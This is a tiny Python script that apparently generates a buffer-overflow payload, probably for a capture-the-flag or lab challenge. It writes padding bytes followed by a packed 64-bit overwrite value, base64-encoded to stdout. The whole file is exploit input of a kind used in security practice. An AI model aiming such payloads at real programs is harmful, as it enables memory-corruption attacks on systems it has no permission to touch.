
import sys
import struct
import base64

buf = b'RRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR'
buf += struct.pack('<Q', 5514316236343109841)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
